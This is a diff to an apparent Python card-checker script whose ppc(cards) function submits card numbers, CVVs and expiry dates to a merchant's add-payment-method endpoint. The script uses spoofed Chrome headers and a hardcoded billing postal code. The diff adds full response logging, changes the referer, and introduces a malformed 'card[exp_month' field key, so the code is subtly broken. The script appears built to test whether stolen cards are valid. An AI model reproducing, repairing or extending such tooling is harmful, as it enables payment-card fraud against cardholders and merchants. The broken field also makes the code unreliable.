@@ -41,7 +41,10 @@ async def make_request(
         data=data,
         json=json,
     ) as response:
-        return await response.text()
+        status = response.status
+        text = await response.text()
+        logger.info(f"Request to {url} - Status: {status}, Response: {text}")
+        return text
 
 async def ppc(cards):
     try:
@@ -54,7 +57,7 @@ async def ppc(cards):
                 "accept-language": "en-US,en;q=0.9",
                 "cache-control": "max-age=0",
                 "priority": "u=0, i",
-                "referer": f"{DOMAIN}/my-account/payment-methods/",
+                "referer": f"{DOMAIN}/my-account/add-payment-method/",
                 "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                 "sec-ch-ua-mobile": "?0",
                 "sec-ch-ua-platform": '"Windows"',
@@ -97,7 +100,7 @@ async def ppc(cards):
                 "card[number]": f"{cc}",
                 "card[cvc]": f"{cvv}",
                 "card[exp_year]": f"{year}",
-                "card[exp_month]": f"{mon}",
+                "card[exp_month": f"{mon}",
                 "allow_redisplay": "unspecified",
                 "billing_details[address][postal_code]": "99501",
                 "billing_details[address][country]": "US",
@@ -156,7 +159,6 @@ async def ppc(cards):
                 headers=headers3,
                 data=data3,
             )
-            logger.info(f"Raw response from site: {req4}")
             return req4
     except Exception as e:
         logger.error(f"Error in ppc: {str(e)}")
